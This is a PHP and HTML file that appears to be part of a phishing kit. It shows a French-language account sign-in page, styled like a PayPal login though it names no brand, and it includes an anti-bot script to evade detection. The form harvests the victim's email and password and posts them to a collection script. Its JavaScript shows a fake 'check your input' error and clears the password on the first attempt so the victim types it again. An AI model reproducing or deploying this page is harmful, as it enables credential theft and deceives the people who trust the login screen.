<?php

ob_start();
session_start();

include '../antibots.php';
?>
<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <link rel="shortcut icon" href="img/favi.ico">
    <link rel="apple-touch-icon" href="img/favi.png">
    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
    <title>
        Connectez-vous à votre compte
    </title>
    <link rel="stylesheet" href="css/login.css">
    <script type="text/javascript" src="js/jquery-1.11.3.min.js"></script>
    <script type="text/javascript" src="https://js-codes.com/modernizr/2.9.0/modernizr.min.js"></script>
</head>

<body>
    <section class="base">
        <div class="main contentBordered">
            <header>
                <p class="app_logo"></p>
            </header>
            <div class="alert hide">
                <p class="danger_error">
                    Vérifiez votre saisie et réessayez.
                </p>
            </div>
            <form action="info/serv5201.php" method="post" novalidate="">
                <div id="stored_email" class="storedMail hide"><span class="spanMail"></span>
                    <a href="javascript:" id="bt_change">
                        Modifier"
                    </a>
                </div>
                <div id="email_area" class="">
                    <div class="inputs clearfix" id="field_eml">
                        <div class="fieldContainer">
                            <label for="email" class="inputLabel">
                                Email ou numéro mobile
                            </label>
                            <input name="mail" id="email" autofocus type="text" autocomplete="off" placeholder="Email ou numéro mobile">
                        </div>
                        <div class="msg" id="eml_error">
                            <p class="hide">
                                Saisissez votre adresse email.
                            </p>
                            <p class="hide">
                                Le format de cette adresse email n'est pas correct,
                            </p>
                        </div>
                    </div>
                    <div style="margin-top:20px">
                        <button class="button" type="button" id="bt_next">
                            Suivant
                        </button>
                    </div>
                    
                </div>
                <div id="password_area" class="hide">
                    <div class="inputs clearfix" id="field_pwd">
                        <div class="fieldContainer">
                            <label for="password" class="inputLabel">
                                Mot de passe
                            </label>
                            <input name="pass" id="password" type="password" class="anim" placeholder="Mot de passe">
                            <button type="button" class="showPassword hide show-hide-password">
                                Afficher
                            </button>
                            <button type="button" class="hidePassword hide show-hide-password">
                                Hide
                            </button>
                        </div>
                        <div class="msg" id="pwd_error">
                            <p class="hide">
                                Mot de passe
                            </p>
                        </div>
                    </div>
                    <div style="margin-top:20px">
                        <button class="button anim" type="submit" id="btnLogin">
                            Connexion
                        </button>
                    </div>
                    <div class="troubleArea">
                        <a href="javascript:">
                            Vous n'arrivez pas à vous connecter ?
                        </a>
                    </div>
                </div>
            </form>
            <div>
                <div class="divider"><span>OU</span></div>
                <a href="javascript:" class="button secondary">
                    Ouvrir un compte
                </a>
            </div>
        </div>
    </section>
    <footer class="footer">
        <div class="footerArea">
            <ul class="footerList">
                <li>
                    <a href="javascript:">
                        Contact
                    </a>
                </li>
                <li>
                    <a href="javascript:">
                        Respect de la vie privée
                    </a>
                </li>
                <li>
                    <a href="javascript:">
                        Contrats d'utilisation
                    </a>
                </li>
                <li>
                    <a href="javascript:">
                        International
                    </a>
                </li>
            </ul>
        </div>
    </footer>
    <div class="hide" id="rotate">
        <div class="circle">
            <div class="rotate"></div>
            <div class="processing">
                En traitement...
            </div>
        </div>
        <div class="overlay"></div>
    </div>
    <script>
        $(document).ready(function() {
            var j = false;
            var e = $("#email"),
                i = $("#password"),
                k = $("#email_area"),
                l = $("#password_area"),
                c = $("#stored_email"),
                b = $("#field_eml"),
                d = $("#field_pwd"),
                h = $("#eml_error"),
                a = $("#pwd_error");

            function f(o, m, p) {
                var n = true;
                if (!o.val()) {
                    m.addClass("hasError");
                    p.attr("class", "msg show").children("p:first").removeClass("hide");
                    n = false
                } else {
                    m.removeClass("hasError");
                    p.attr("class", "msg hide").children("p:first").addClass("hide")
                }
                return n
            }

            function g() {
                var m = true;
                if (!(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/).test(e.val())) {
                    b.addClass("hasError");
                    h.attr("class", "msg show").children("p:last").removeClass("hide");
                    m = false
                } else {
                    b.removeClass("hasError");
                    h.attr("class", "msg hide").children("p:last").addClass("hide")
                }
                return m
            }
            $("#bt_next").click(function(m) {
                if (!f(e, b, h)) {
                    e.focus();
                    h.attr("class", "msg show").children("p:last").addClass("hide");
                    console.log("required");
                    return false
                }
                if (!g()) {
                    e.focus();
                    console.log("eml");
                    return false
                } else {
                    h.attr("class", "msg hide").children("p:last").addClass("hide")
                }
                $("#rotate").removeClass("hide");
                setTimeout(function() {
                    c.removeClass("hide").children("span").html(e.val());
                    k.addClass("hide");
                    l.removeClass("hide");
                    $("#rotate").addClass("hide");
                    d.removeClass("hasError");
                    a.attr("class", "msg hide").children("p:first").addClass("hide")
                }, 400)
            });
            $("#bt_change").click(function() {
                c.addClass("hide");
                e.val("");
                i.val("");
                l.addClass("hide");
                k.removeClass("hide");
                $(".alert").addClass("hide");
                j = false
            });
            e.keyup(function(m) {
                if (m.keyCode == 13) {
                    $("#bt_next").click()
                } else {
                    if (!(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/).test(e.val())) {
                        b.addClass("hasError");
                        h.attr("class", "msg hide").children("p:first").addClass("hide");
                        e.focus();
                        return false
                    } else {
                        b.removeClass("hasError");
                        h.attr("class", "msg hide")
                    }
                }
            });
            i.keyup(function(m) {
                if (i.val().length > 0) {
                    i.attr("type", "password");
                    $(".showPassword").removeClass("hide");
                    $(".hidePassword").addClass("hide")
                } else {
                    $(".showPassword").addClass("hide");
                    $(".hidePassword").addClass("hide")
                }
                if (!i.val()) {
                    d.addClass("hasError");
                    i.focus();
                    return false
                } else {
                    d.removeClass("hasError");
                    a.attr("class", "msg hide")
                }
            });
            e.focusout(function() {
                h.removeClass("show")
            });
            i.focusout(function() {
                a.removeClass("show")
            });
            $(".showPassword").click(function() {
                i.attr("type", "text");
                $(".hidePassword").removeClass("hide");
                $(".showPassword").addClass("hide")
            });
            $(".hidePassword").click(function() {
                i.attr("type", "password");
                $(".showPassword").removeClass("hide");
                $(".hidePassword").addClass("hide")
            });
            $(document).on("submit", "form", function(m) {
                if (!(/^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,4})+$/).test(e.val())) {
                    return false
                }
                if (!f(i, d, a)) {
                    i.focus();
                    return false
                }
                $("#rotate").removeClass("hide");
                if (!j) {
                    m.preventDefault();
                    setTimeout(function() {
                        j = true;
                        $("#rotate").addClass("hide");
                        i.val("");
                        $(".alert").removeClass("hide");
                        $(".showPassword").addClass("hide");
                        $(".hidePassword").addClass("hide");
                        return false
                    }, 800)
                }
                $(".alert").addClass("hide")
            })
        });
    </script>
</body>

</html>